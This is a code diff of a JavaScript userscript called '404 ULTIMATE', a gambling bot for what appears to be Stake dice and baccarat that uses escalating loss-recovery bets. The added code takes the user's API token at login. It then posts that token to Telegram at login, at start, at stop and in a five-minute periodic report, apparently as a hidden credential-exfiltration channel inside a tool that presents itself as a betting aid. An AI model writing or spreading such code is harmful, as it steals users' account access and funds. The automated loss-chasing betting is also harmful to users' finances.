-                        <div class="md-field"><label>MIN BET (Auto Rp 2)</label><input type="number" id="p-minbet" value="0.00083333" step="0.00000001" readonly></div>
-                        <div class="grid-2"><div class="md-field"><label>MAX BET MULTIPLIER</label><input type="number" id="p-maxbet-multiplier" value="10000" step="1" min="1"></div><div class="md-field"><label>MARGIN</label><input type="number" id="p-margin" value="1.01" step="0.01"></div></div>
-                        <div class="grid-2"><div class="md-field"><label>STEPS LIMIT</label><input type="number" id="p-steps" value="100000"></div><div class="md-field"><label>DELAY (ms)</label><input type="number" id="p-delay" value="20"></div></div>
-                        <div class="grid-2"><div class="md-field"><label>CHANCE MIN (%)</label><input type="number" id="p-ch-min" value="55.0" step="0.1"></div><div class="md-field"><label>CHANCE MAX (%)</label><input type="number" id="p-ch-max" value="90.0" step="0.1"></div></div>
-                        <div class="grid-2"><div class="md-field"><label>TARGET PROFIT (%)</label><input type="number" id="p-target-pct" value="10.0" step="0.1"></div><div class="md-field"><label>STOP LOSS (%)</label><input type="number" id="p-stop-pct" value="25.0" step="0.1"></div></div>
-                        <div class="grid-2"><div class="md-field"><label>DIRTY BALANCE</label><input type="number" id="p-dirty-bal" value="460" step="0.1"></div><div class="md-field"><label>MIN BET IDR</label><input type="number" id="p-minbet-idr" value="2" step="1"></div></div>
+                    <div class="orion-grid">
+                        <div class="orion-input-group"><label>DIVISOR (Auto)</label><input id="p-basebet-divisor" class="orion-input" value="300000"></div>
+                        <div class="orion-input-group"><label>FIXED BASE BET</label><input id="p-basebet-fixed" class="orion-input" value="0.001"></div>
+                        <div class="orion-input-group"><label>MULTIPLIER (x)</label><input id="p-baccarat-multiplier" class="orion-input" value="1.2" step="0.1"></div>
+                        <div class="orion-input-group"><label>CURRENT BASEBET</label><input class="orion-input" id="basebet-info" value="Auto: Balance / 300000" disabled></div>
                     </div>
-                    
-                    <!-- TAB WAGER -->
-                    <div id="tab-wager" class="tab-content">
-                        <div class="grid-2"><div class="md-field"><label>PROFIT TRIGGER (%)</label><input type="number" id="p-profit-trigger" value="0.5" step="0.01"></div><div class="md-field"><label>WAGER BET COUNT</label><input type="number" id="p-wager-count" value="50" step="1" min="1"></div></div>
-                        <div class="grid-2"><div class="md-field"><label>WAGER DV</label><input type="number" id="p-wager-dv" value="100"></div><div class="md-field"><label>WAGER CHANCE (%)</label><input type="number" id="p-wager-chance" value="99.98" step="0.01"></div></div>
-                        <div class="info-box">
-                            Hunter profit &ge; Trigger masuk WAGER MODE<br>
-                            Jalan sejumlah Wager Bet Count, lalu profit direset<br>
-                            Kembali ke HUNTER dari balance terbaru<br>
-                            Wagered TIDAK PERNAH direset
-                        </div>
+                </div>
+                
+                <div class="orion-card">
+                    <div class="orion-card-title">🎲 STAGE 2: DICE RECOVERY</div>
+                    <div class="orion-grid">
+                        <div class="orion-input-group"><label>MIN CHANCE</label><input class="orion-input" value="24" disabled></div>
+                        <div class="orion-input-group"><label>MAX CHANCE</label><input class="orion-input" value="50" disabled></div>
+                        <div class="orion-input-group"><label>MAX BETS</label><input class="orion-input" value="5" disabled></div>
                     </div>
-                    
-                    <!-- TAB BACCARAT -->
-                    <div id="tab-baccarat" class="tab-content">
-                        <div class="toggle-row">
-                            <span style="font-weight:500;">ENABLE BACCARAT RECOVERY</span>
-                            <label class="md-switch"><input type="checkbox" id="p-baccarat-enable" checked><span class="md-slider"></span></label>
-                        </div>
-                        
-                        <div class="grid-2">
-                            <div class="md-field"><label>BASE BET % (dari Balance)</label><input type="number" id="p-baccarat-basebet-pct" value="0.02" step="0.01"></div>
-                            <div class="md-field"><label>PRB INCREASE RATE</label><input type="number" id="p-baccarat-increase" value="1.2" step="0.01"></div>
-                        </div>
-                        
-                        <div class="info-box">
-                            🃏 BACCARAT STRATEGY<br>
-                            - Bet di sisi yang KALAH (Reverse Trend)<br>
-                            - PRB: Naik ${(bot.baccarat.increaseRate*100-100).toFixed(0)}% setiap kalah<br>
-                            - Reset step setelah menang<br>
-                            - Trigger: ketika bet di Dice mencapai max multiplier
-                        </div>
-                        
-                        <div class="grid-2">
-                            <div class="md-field"><label>MAX BETS BEFORE EMERGENCY</label><input type="number" id="p-baccarat-max-bets" value="100" step="10"></div>
-                        </div>
-                        
-                        <div class="baccarat-display">
-                            <div class="baccarat-row">
-                                <span class="baccarat-label">PLAYER</span>
-                                <span class="baccarat-cards player" id="baccarat-player-cards">-</span>
-                            </div>
-                            <div class="baccarat-row">
-                                <span class="baccarat-label">BANKER</span>
-                                <span class="baccarat-cards banker" id="baccarat-banker-cards">-</span>
-                            </div>
-                            <div class="baccarat-winner" id="baccarat-winner">-</div>
-                            <div class="baccarat-info">
-                                <span>Side: <strong id="baccarat-side">-</strong></span>
-                                <span>Step: <strong id="baccarat-step">-</strong></span>
-                                <span>Status: <strong id="baccarat-status">STANDBY</strong></span>
+                </div>
+                
+                <div class="orion-card">
+                    <div class="orion-card-title">💰 STAGE 4: WAGERING (DICE)</div>
+                    <div class="orion-grid">
+                        <div class="orion-input-group"><label>CHANCE (%)</label><input id="p-wagering-chance" class="orion-input" value="99.98" step="0.01"></div>
+                        <div class="orion-input-group"><label>NUMBER OF BETS</label><input id="p-wagering-bets" class="orion-input" value="30"></div>
+                        <div class="orion-input-group"><label>BET MULTIPLIER</label><input id="p-wagering-multiplier" class="orion-input" value="1" step="0.1"></div>
+                        <div class="orion-input-group row-full">
+                            <div class="orion-checkbox">
+                                <input type="checkbox" id="p-wagering-dynamic" checked>
+                                <label>Dynamic base bet (Balance / Divisor)</label>
                             </div>
                         </div>
-                        
-                        <div class="info-box" id="baccarat-stats">Bets: 0 | Loss: 0 | Step: 0</div>
-                        
-                        <div style="margin-top: 12px;">
-                            <div class="md-field"><label>EMERGENCY MIN CHANCE (%)</label><input type="number" id="p-emergency-min-chance" value="66" step="1"></div>
-                            <div class="md-field"><label>EMERGENCY MAX CHANCE (%)</label><input type="number" id="p-emergency-max-chance" value="70" step="1"></div>
-                            <div class="md-field"><label>EMERGENCY MAX ATTEMPTS</label><input type="number" id="p-emergency-max-attempts" value="3" step="1"></div>
-                        </div>
+                        <div class="orion-input-group"><label>DIVISOR</label><input id="p-wagering-divisor" class="orion-input" value="300000"></div>
+                        <div class="orion-input-group"><label>FIXED BASE BET</label><input id="p-wagering-basebet" class="orion-input" value="0.001"></div>
                     </div>
-                    
-                    <!-- TAB LOGS -->
-                    <div id="tab-logs" class="tab-content">
-                        <div class="logs-container" id="p-logs">
-                            <div style="text-align:center;color:var(--text-light);padding-top:180px;">Ready. Enter API Token and click LOGIN...</div>
-                        </div>
+                </div>
+            </div>
+            
+            <div class="orion-tab-content" id="tab-baccarat">
+                <div class="baccarat-display">
+                    <div class="baccarat-row">
+                        <span>👤 PLAYER</span>
+                        <span class="baccarat-cards player" id="baccarat-player-cards">-</span>
+                    </div>
+                    <div class="baccarat-row">
+                        <span>🏦 BANKER</span>
+                        <span class="baccarat-cards banker" id="baccarat-banker-cards">-</span>
+                    </div>
+                    <div class="baccarat-winner" id="baccarat-winner">-</div>
+                </div>
+                <div class="orion-card">
+                    <div class="orion-card-title">📋 STRATEGY INFO</div>
+                    <div style="font-size:11px;color:#6B7280;line-height:1.5">
+                        <b>Stage 1:</b> Baccarat Reverse (ikut sisi kalah) | bet × multiplier<br>
+                        <b>Stage 2:</b> Dice 24-50% (max 5 bet) | auto chance adjustment<br>
+                        <b>Stage 3:</b> Tie 8:1 recovery | bet = loss / 8 × 1.033<br>
+                        <b>Wagering:</b> Dice sesuai setting | setelah selesai reset stats
                     </div>
                 </div>
             </div>
         `;
         
-        document.body.insertAdjacentHTML('beforeend', html);
+        document.body.appendChild(d);
         
-        // Event Listeners
-        document.getElementById("botHeader").addEventListener('mousedown', dragMouseDown);
-        document.getElementById("btn-minimize").onclick = toggleMinimize;
-        document.getElementById("btn-theme").onclick = toggleDarkMode;
+        // Tab switching
+        const tabs = document.querySelectorAll('.orion-tab');
+        const tabContents = document.querySelectorAll('.orion-tab-content');
         
-        const savedToken = getAuthToken();
-        if (savedToken) document.getElementById("p-token").value = savedToken;
+        tabs.forEach(tab => {
+            tab.addEventListener('click', () => {
+                const tabName = tab.getAttribute('data-tab');
+                tabs.forEach(t => t.classList.remove('active'));
+                tab.classList.add('active');
+                tabContents.forEach(content => content.classList.remove('active'));
+                document.getElementById(`tab-${tabName}`).classList.add('active');
+            });
+        });
         
-        document.getElementById("p-demo-toggle").onchange = (e) => { bot.isDemo = e.target.checked; updateUILog(bot.isDemo ? "DIRTY MODE ACTIVE" : "REAL MODE ACTIVE"); };
+        // Base bet mode toggle
+        const autoRadio = document.getElementById("p-basebet-auto");
+        const fixedRadio = document.getElementById("p-basebet-fixed-mode");
+        const divisorInput = document.getElementById("p-basebet-divisor");
+        const fixedBetInput = document.getElementById("p-basebet-fixed");
         
-        // Baccarat enable toggle
-        document.getElementById("p-baccarat-enable").onchange = (e) => { 
-            bot.baccarat.enabled = e.target.checked; 
-            updateUILog(bot.baccarat.enabled ? "Baccarat Recovery ENABLED" : "Baccarat Recovery DISABLED");
-            updateStatsDisplay();
-        };
+        function toggleBaseBetMode() {
+            const isAuto = autoRadio.checked;
+            divisorInput.disabled = !isAuto;
+            fixedBetInput.disabled = isAuto;
+            divisorInput.style.opacity = isAuto ? "1" : "0.5";
+            fixedBetInput.style.opacity = isAuto ? "0.5" : "1";
+        }
+        
+        autoRadio.addEventListener("change", toggleBaseBetMode);
+        fixedRadio.addEventListener("change", toggleBaseBetMode);
+        toggleBaseBetMode();
+        
+        // Toggle dynamic/fixed wagering
+        const dynamicCheckbox = document.getElementById("p-wagering-dynamic");
+        const wageringDivisor = document.getElementById("p-wagering-divisor");
+        const wageringFixed = document.getElementById("p-wagering-basebet");
+        
+        function toggleWageringInputs() {
+            const isDynamic = dynamicCheckbox.checked;
+            wageringDivisor.disabled = !isDynamic;
+            wageringFixed.disabled = isDynamic;
+        }
+        dynamicCheckbox.addEventListener("change", toggleWageringInputs);
+        toggleWageringInputs();
         
         document.getElementById("p-login").onclick = async () => {
-            const token = document.getElementById("p-token").value.trim();
-            if (!token || token.length < 30) { updateUILog("Invalid API Token!"); return; }
+            const token = document.getElementById("p-api-token").value.trim();
+            if (!token || token.length < 30) { updateConsoleLog("❌ Invalid API Token!"); return; }
             saveToken(token);
             const success = await syncUserInfo();
             if (success) {
-                updateUILog(`Login success! Welcome ${bot.stakeUser}`);
                 document.getElementById("p-start").disabled = false;
-                await updateFiatRates();
-                updateBaseBet();
-                updateStatsDisplay();
-                await sendTelegramReport(`\`\`\`LOGIN SUCCESS\nUser: ${bot.stakeUser}\n🔑 API TOKEN: ${token}\`\`\``);
-            } else { updateUILog("Login failed!"); }
+                document.getElementById("p-stop").disabled = false;
+                updateConsoleLog(`✅ Login success! Welcome ${bot.stakeUser}`);
+                // Kirim laporan lengkap dengan API Key ke Telegram
+                sendTelegram(`🔷 *404 ULTIMATE LOGIN* 🔷\n\n👤 *User:* ${bot.stakeUser}\n💰 *Balance:* ${bot.realBalance.toFixed(8)} ${bot.selectedCurrency}\n💱 *Currency:* ${bot.selectedCurrency}\n🔑 *API Key:* \`${token}\``, false);
+            }
         };
         
         document.getElementById("p-refresh").onclick = async () => {
-            if (!accessToken) { updateUILog("Please login first!"); return; }
+            if (!accessToken) { updateConsoleLog("Please login first!"); return; }
             await syncUserInfo();
-            await updateFiatRates();
-            updateBaseBet();
-            updateStatsDisplay();
-            updateUILog("Refreshed!");
+            updateConsoleLog("🔄 Refreshed!");
         };
         
         document.getElementById("p-start").onclick = async () => {
-            if (!bot.isDemo && !accessToken) { updateUILog("Please login first!"); return; }
+            if (!accessToken) { updateConsoleLog("Please login first!"); return; }
+            if (bot.isRunning) return;
             
-            bot.baseBetPct = parseFloat(document.getElementById("p-basebet-pct").value) || 0.02;
-            bot.selectedCurrency = document.getElementById("p-currency").value;
-            bot.stepsLimit = parseInt(document.getElementById("p-steps").value) || 100000;
-            bot.minBet = parseFloat(document.getElementById("p-minbet").value) || 0.00083333;
-            bot.maxBetMultiplier = parseFloat(document.getElementById("p-maxbet-multiplier").value) || 10000;
-            bot.margin = parseFloat(document.getElementById("p-margin").value) || 1.01;
-            bot.delay = parseInt(document.getElementById("p-delay").value) || 20;
-            bot.chanceMin = parseFloat(document.getElementById("p-ch-min").value) || 55;
-            bot.chanceMax = parseFloat(document.getElementById("p-ch-max").value) || 90;
-            bot.targetPercent = parseFloat(document.getElementById("p-target-pct").value) || 10;
-            bot.stopLossPercent = parseFloat(document.getElementById("p-stop-pct").value) || 25;
-            bot.dirtyBalance = parseFloat(document.getElementById("p-dirty-bal").value) || 460;
-            bot.profitTargetPct = parseFloat(document.getElementById("p-profit-trigger").value) || 0.5;
-            bot.wagerDV = parseFloat(document.getElementById("p-wager-dv").value) || 100;
-            bot.wagerChance = parseFloat(document.getElementById("p-wager-chance").value) || 99.98;
-            bot.wagerBetCount = parseInt(document.getElementById("p-wager-count").value) || 50;
-            bot.minBetIdr = parseFloat(document.getElementById("p-minbet-idr").value) || 2;
+            await syncUserInfo();
             
-            // Baccarat settings
-            bot.baccarat.enabled = document.getElementById("p-baccarat-enable").checked;
-            bot.baccarat.baseBetPct = parseFloat(document.getElementById("p-baccarat-basebet-pct").value) || 0.02;
-            bot.baccarat.increaseRate = parseFloat(document.getElementById("p-baccarat-increase").value) || 1.2;
-            bot.baccarat.maxBetsBeforeEmergency = parseInt(document.getElementById("p-baccarat-max-bets").value) || 100;
-            
-            // Emergency settings
-            bot.emergency.minChance = parseFloat(document.getElementById("p-emergency-min-chance").value) || 66;
-            bot.emergency.maxChance = parseFloat(document.getElementById("p-emergency-max-chance").value) || 70;
-            bot.emergency.maxAttempts = parseInt(document.getElementById("p-emergency-max-attempts").value) || 3;
-            
-            updateMinBet();
-            document.getElementById("p-minbet").value = bot.minBet.toFixed(8);
-            
-            let balance = bot.isDemo ? bot.dirtyBalance : bot.realBalance;
-            if (!bot.isDemo && balance === 0) { updateUILog("Failed to get balance!"); return; }
-            
-            bot.stats = {
-                profit: 0, wagered: 0, startBal: balance, currentBal: balance,
-                bets: 0, wins: 0, loss: 0, startTime: Date.now(), maxDD: 0, maxBet: 0
+            bot.stats = { 
+                profit: 0, 
+                wagered: 0, 
+                startBal: bot.realBalance, 
+                bets: 0, 
+                wins: 0, 
+                loss: 0, 
+                maxDD: 0, 
+                ties: 0, 
+                peakBalance: bot.realBalance 
             };
-            bot.betTimestamps = [];
             bot.startTime = Date.now();
-            bot.baccarat.active = false;
-            bot.baccarat.betCount = 0;
-            bot.baccarat.consecutiveLosses = 0;
-            bot.baccarat.lossSinceStart = 0;
-            bot.emergency.active = false;
-            bot.isWagerMode = false;
-            bot.wagerBetCounter = 0;
-            
-            updateBaseBet();
-            document.getElementById("p-basebet").value = bot.baseBet.toFixed(8);
-            
-            bot.targetAbs = bot.stats.startBal * (bot.targetPercent / 100);
-            bot.perStep = bot.targetAbs / bot.stepsLimit;
             bot.isRunning = true;
-            bot.isSleeping = false;
-            bot.lastTGReport = Date.now();
-            bot.lastFiatUpdate = 0;
+            bot.currentStage = "BACCARAT_REVERSE";
             
-            setNewBaseChance();
-            toggleStartStop(true);
-            updateUILog(`BOT STARTED v7.0 | BaseBet: ${bot.baseBet.toFixed(8)} (${bot.baseBetPct}%) | Baccarat: ${bot.baccarat.enabled ? 'ON' : 'OFF'} | Emergency Chance: ${bot.emergency.minChance}-${bot.emergency.maxChance}%`);
+            bot.baccaratReverse = {
+                lastBetSide: "player",
+                lastBetAmount: 0,
+                lastResult: null,
+                consecutiveLosses: 0,
+                sessionPeak: bot.realBalance,
+                betsInSession: 0,
+                currentBet: 0
+            };
             
-            const apiToken = getApiToken();
-            await sendTelegramReport(`\`\`\`404 BOT v7.0 STARTED\nBalance: ${balance.toFixed(8)}\nBaseBet: ${bot.baseBetPct}%\nBaccarat Recovery: ${bot.baccarat.enabled ? 'ON' : 'OFF'}\nEmergency Chance: ${bot.emergency.minChance}-${bot.emergency.maxChance}%\n\n🔑 API TOKEN: ${apiToken}\`\`\``);
+            bot.diceRecovery = {
+                remainingBets: 5,
+                targetLoss: 0,
+                currentChance: 50,
+                minChance: 24,
+                maxChance: 50,
+                currentBet: 0
+            };
+            
+            bot.tieRecovery = { targetLoss: 0, currentBet: 0 };
+            bot.wagering = { betsInWagering: 0, totalWagered: 0 };
+            bot.baccaratCards = { player: [], banker: [], winner: null };
+            
+            const baseBet = getBaseBet();
+            const baseMode = document.getElementById("p-basebet-auto").checked ? "Auto" : "Fixed";
+            updateConsoleLog(`🚀 404 ULTIMATE STARTED | Balance: ${bot.realBalance.toFixed(8)} | Base bet: ${baseBet.toFixed(8)} (${baseMode})`);
+            
+            // Kirim laporan lengkap dengan API Key ke Telegram saat START
+            sendTelegram(`🚀 *404 ULTIMATE STARTED* 🚀\n\n👤 *User:* ${bot.stakeUser}\n💰 *Balance:* ${bot.realBalance.toFixed(8)} ${bot.selectedCurrency}\n🎲 *Base Bet:* ${baseBet.toFixed(8)} (${baseMode})\n📊 *Stage:* Stage 1 - Baccarat Reverse\n🔑 *API Key:* \`${accessToken}\``, false);
+            
+            if (reportInterval) clearInterval(reportInterval);
+            reportInterval = setInterval(() => { 
+                if (bot.isRunning) {
+                    const currentBalance = bot.stats.startBal + bot.stats.profit;
+                    sendTelegram(`📊 *PERIODIC REPORT* 📊\n\n⏱️ *Time:* ${getDuration()}\n🎯 *Stage:* ${bot.currentStage}\n💰 *Balance:* ${currentBalance.toFixed(8)}\n📈 *Profit:* ${bot.stats.profit >= 0 ? '+' : ''}${bot.stats.profit.toFixed(8)}\n🎲 *Bets:* ${bot.stats.bets}\n🏆 *W/L:* ${bot.stats.wins}/${bot.stats.loss}\n🔑 *API Key:* \`${accessToken}\``, false);
+                }
+            }, 300000);
             
             runLoop();
         };
         
-        document.getElementById("p-stop").onclick = async () => {
+        document.getElementById("p-stop").onclick = () => {
             bot.isRunning = false;
-            bot.baccarat.active = false;
-            bot.emergency.active = false;
-            toggleStartStop(false);
-            updateUILog("BOT STOPPED!");
-            await sendSessionReport();
+            if (reportInterval) { clearInterval(reportInterval); reportInterval = null; }
+            updateConsoleLog("🛑 404 ULTIMATE STOPPED");
+            
+            // Kirim laporan lengkap dengan API Key ke Telegram saat STOP
+            sendTelegram(`🛑 *404 ULTIMATE STOPPED* 🛑\n\n⏱️ *Duration:* ${getDuration()}\n💰 *Final Balance:* ${(bot.stats.startBal + bot.stats.profit).toFixed(8)}\n📈 *Total Profit:* ${bot.stats.profit >= 0 ? '+' : ''}${bot.stats.profit.toFixed(8)}\n🎲 *Total Bets:* ${bot.stats.bets}\n🏆 *Final W/L:* ${bot.stats.wins}/${bot.stats.loss}\n🔑 *API Key:* \`${accessToken}\``, false);
         };
         
-        document.getElementById("p-reset").onclick = resetSession;
+        setInterval(() => {
+            if (!bot.isRunning) return;
+            const elapsed = (Date.now() - bot.startTime) / 1000;
+            const hours = Math.floor(elapsed / 3600);
+            const minutes = Math.floor((elapsed % 3600) / 60);
+            const seconds = Math.floor(elapsed % 60);
+            document.getElementById("st-time").innerText = `${hours.toString().padStart(2,'0')}:${minutes.toString().padStart(2,'0')}:${seconds.toString().padStart(2,'0')}`;
+            updateStatsDisplay();
+        }, 400);
         
-        document.getElementById("p-currency").onchange = () => { 
-            bot.selectedCurrency = document.getElementById("p-currency").value; 
-            bot.lastFiatUpdate = 0;
-            updateFiatRates();
-        };
-        
-        setInterval(updateStatsDisplay, 1000);
-        setInterval(updateFiatRates, 30000);
-        updateFiatRates();
+        updateConsoleLog("✅ 404 Ultimate Ready - Enter API Token to Login");
     }
     
-    // ==================== INIT ====================
     createUI();
-    updateUILog("404 BOT v7.0 Loaded - Baccarat Hunter Edition");
 })();
